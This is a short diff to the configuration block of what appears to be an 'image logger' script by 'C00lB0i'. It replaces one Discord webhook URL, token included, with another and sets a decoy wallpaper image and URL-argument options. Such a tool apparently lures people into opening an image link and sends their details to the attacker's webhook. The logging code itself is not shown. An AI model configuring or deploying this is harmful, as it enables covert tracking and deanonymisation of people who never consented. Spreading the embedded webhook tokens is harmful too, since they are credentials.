@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1404389210844172339/ADfE1vHKA38fJS3a6i7hlzqzEAHb28GVYJGLf8Jo5Q5Aqh2X2txVf8BwV-sOfIL7QuWX",
+    "webhook": "https://discord.com/api/webhooks/1402394195011964989/UJOSRg7CaoYO9DHWsbQHKSqBPnEuQet3gfmCNGLvUvz-U8KDDbfflHmbmyrcB9aO2sSy",
     "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
